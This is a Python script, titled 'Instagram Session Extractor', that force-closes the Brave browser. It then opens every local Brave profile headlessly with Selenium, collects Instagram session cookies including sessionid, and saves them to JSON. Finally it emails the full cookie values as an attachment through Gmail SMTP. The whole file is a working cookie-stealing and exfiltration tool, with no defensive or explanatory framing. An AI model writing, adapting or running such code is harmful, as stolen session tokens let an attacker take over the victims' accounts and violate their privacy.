import os
import json
import time
import psutil
import smtplib
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager

# Configuration
BRAVE_PATH = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
USER_DATA_DIR = os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data")
INSTAGRAM_URL = "https://www.instagram.com/"
OUTPUT_DIR = "instagram_profiles_data"

# Email Configuration
EMAIL_SENDER = "your email address"
EMAIL_PASSWORD = "your gmail app password"
EMAIL_RECEIVER = "your email address"
EMAIL_SUBJECT = "Instagram Profile Data Report"


def kill_brave_processes():

    print("🧹 Force killing Brave processes...")
    killed = 0

    # Use taskkill for faster process termination
    os.system('taskkill /f /im brave.exe >nul 2>&1')
    os.system('taskkill /f /im chromedriver.exe >nul 2>&1')
    os.system('taskkill /f /im brave_browser.exe >nul 2>&1')

    # Additional cleanup with psutil
    for proc in psutil.process_iter(['name', 'pid']):
        try:
            proc_name = proc.info['name'].lower() if proc.info['name'] else ''
            if any(name in proc_name for name in
                   ['brave.exe', 'brave', 'chromedriver.exe', 'chromedriver', 'brave_browser.exe']):
                proc.kill()
                killed += 1
        except:
            pass

    if killed > 0:
        print(f"✅ Killed {killed} processes")
    time.sleep(2)  # Short wait


def get_valid_profiles():

    if not os.path.exists(USER_DATA_DIR):
        print(f"❌ User data directory not found: {USER_DATA_DIR}")
        return []

    profiles = []
    try:
        for item in os.listdir(USER_DATA_DIR):
            if item.startswith("Profile") or item == "Default":
                profile_path = os.path.join(USER_DATA_DIR, item)
                if os.path.isdir(profile_path):
                    prefs_path = os.path.join(profile_path, "Preferences")
                    if os.path.exists(prefs_path):
                        profiles.append(item)
    except Exception as e:
        print(f"❌ Error reading profiles: {e}")

    return sorted(profiles)


def is_instagram_logged_in_fast(driver):

    try:
        # Method 1: Check for sessionid cookie (FASTEST)
        cookies = driver.get_cookies()
        for cookie in cookies:
            if 'sessionid' in cookie['name'].lower():
                return True

        # Method 2: Quick DOM check
        current_url = driver.current_url.lower()
        if "instagram.com/accounts/login" in current_url or "/login" in current_url:
            return False


        try:
            nav_elements = driver.find_elements(By.XPATH, '//nav')
            if nav_elements:
                return True
        except:
            pass

        return False

    except Exception:
        return False


def setup_driver_fast(profile_name):

    try:
        options = Options()
        options.binary_location = BRAVE_PATH
        options.add_argument(f"--user-data-dir={USER_DATA_DIR}")
        options.add_argument(f"--profile-directory={profile_name}")

        # SPEED OPTIMIZATIONS
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-images")
        options.add_argument("--disable-javascript")
        options.add_argument("--disable-plugins")
        options.add_argument("--disable-background-timer-throttling")
        options.add_argument("--disable-renderer-backgrounding")
        options.add_argument("--disable-backgrounding-occluded-windows")
        options.add_argument("--memory-pressure-off")
        options.add_argument("--max_old_space_size=1024")


        options.add_argument("--aggressive-cache-discard")
        options.add_argument("--media-cache-size=1")

        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)


        driver.set_page_load_timeout(10)
        driver.implicitly_wait(3)

        return driver

    except Exception as e:
        print(f"❌ Driver setup failed for {profile_name}: {e}")
        return None


def extract_data_fast(driver, profile_name):

    try:

        cookies = driver.get_cookies()
        cookies_dict = {c['name']: c['value'] for c in cookies}


        session_cookies = {}
        for name, value in cookies_dict.items():
            if 'session' in name.lower():
                session_cookies[name] = value

        data = {
            "profile": profile_name,
            "logged_in": len(session_cookies) > 0,
            "cookies_count": len(cookies_dict),
            "session_cookies": session_cookies,
            "has_sessionid": 'sessionid' in [c.lower() for c in cookies_dict.keys()],
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "url": driver.current_url
        }

        return data

    except Exception as e:
        print(f"❌ Data extraction failed: {e}")
        return None


def process_profile_fast(profile_name):

    driver = None
    start_time = time.time()

    try:
        print(f"🚀 {profile_name}: Starting...")


        driver = setup_driver_fast(profile_name)
        if not driver:
            return None


        try:
            driver.get(INSTAGRAM_URL)
            time.sleep(2)  # Minimal wait
        except TimeoutException:
            print(f"⚠️ {profile_name}: Page load timeout, continuing...")

        # Quick login check
        is_logged_in = is_instagram_logged_in_fast(driver)
        print(f"🔐 {profile_name}: {'LOGGED IN ✅' if is_logged_in else 'NOT LOGGED IN 🔴'}")

        # Extract data
        profile_data = extract_data_fast(driver, profile_name)

        if profile_data and profile_data.get('logged_in'):
            # Save data
            os.makedirs(OUTPUT_DIR, exist_ok=True)
            filename = os.path.join(OUTPUT_DIR, f"{profile_name}_data.json")
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(profile_data, f, indent=2, ensure_ascii=False)

            elapsed = time.time() - start_time
            print(f"✅ {profile_name}: Success! ({elapsed:.1f}s)")
            return profile_data
        else:
            elapsed = time.time() - start_time
            print(f"🔴 {profile_name}: No session ({elapsed:.1f}s)")
            return None

    except Exception as e:
        elapsed = time.time() - start_time
        print(f"❌ {profile_name}: Error - {e} ({elapsed:.1f}s)")
        return None
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass


def send_email_fast(collected_data):
    """Send email quickly"""
    if not collected_data:
        print("📧 No data to send")
        return False

    try:
        print("📧 Preparing quick email...")

        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = EMAIL_SUBJECT

        # Simple body
        body = f"Instagram Session Report\n\n"
        body += f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        body += f"Profiles with sessions: {len(collected_data)}\n\n"

        for data in collected_data:
            body += f"📱 {data['profile']}\n"
            body += f"   Session cookies: {len(data['session_cookies'])}\n"
            if data['session_cookies']:
                for name, value in list(data['session_cookies'].items())[:2]:  # Show first 2
                    body += f"   - {name}: {value[:30]}...\n"
            body += "\n"

        msg.attach(MIMEText(body, 'plain'))

        # Attach combined JSON
        combined_data = {
            "report_time": time.strftime('%Y-%m-%d %H:%M:%S'),
            "profiles_with_sessions": len(collected_data),
            "data": collected_data
        }

        json_part = MIMEApplication(
            json.dumps(combined_data, indent=2).encode('utf-8'),
            Name="instagram_sessions.json"
        )
        json_part['Content-Disposition'] = 'attachment; filename="instagram_sessions.json"'
        msg.attach(json_part)

        # Send email
        with smtplib.SMTP('smtp.gmail.com', 587, timeout=30) as server:
            server.starttls()
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)

        print("✅ Email sent!")
        return True

    except Exception as e:
        print(f"❌ Email failed: {e}")
        return False


def main():
    print("=" * 50)
    print("🚀 INSTAGRAM SESSION EXTRACTOR - ULTRA FAST")
    print("=" * 50)

    # Verify Brave
    if not os.path.exists(BRAVE_PATH):
        print(f"❌ Brave not found: {BRAVE_PATH}")
        return

    # Kill everything first
    print("\n🛑 KILLING ALL BRAVE PROCESSES...")
    kill_brave_processes()

    # Get profiles
    print("\n🔍 Scanning profiles...")
    profiles = get_valid_profiles()

    if not profiles:
        print("❌ No profiles found!")
        return

    print(f"✅ Found {len(profiles)} profiles")


    if os.path.exists(OUTPUT_DIR):
        shutil.rmtree(OUTPUT_DIR)
    os.makedirs(OUTPUT_DIR)


    print(f"\n⚡ PROCESSING {len(profiles)} PROFILES...")
    collected_data = []

    total_start = time.time()

    for i, profile in enumerate(profiles, 1):
        print(f"\n--- [{i}/{len(profiles)}] {profile} ---")

        data = process_profile_fast(profile)
        if data:
            collected_data.append(data)


        if i < len(profiles):
            time.sleep(1)

    total_time = time.time() - total_start

    # Results
    print(f"\n{'=' * 50}")
    print("📊 FINAL RESULTS")
    print(f"{'=' * 50}")
    print(f"✅ Profiles with sessions: {len(collected_data)}/{len(profiles)}")
    print(f"⏱️  Total time: {total_time:.1f} seconds")
    print(f"📁 Data saved in: {OUTPUT_DIR}")

    if collected_data:
        print(f"\n🎯 ACTIVE SESSIONS FOUND:")
        for data in collected_data:
            print(f"   ✅ {data['profile']} - {len(data['session_cookies'])} session cookies")

        # Send email
        print(f"\n📧 Sending report...")
        send_email_fast(collected_data)
    else:
        print(f"\n❌ No active sessions found!")
        print(f"\n💡 TIPS:")
        print(f"1. Login to Instagram in Brave first")
        print(f"2. Make sure Brave is COMPLETELY closed before running")
        print(f"3. Check if cookies are enabled")

    print(f"\n🎉 DONE! Completed in {total_time:.1f}s")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️ Stopped by user")
    except Exception as e:
        print(f"\n💥 CRITICAL ERROR: {e}")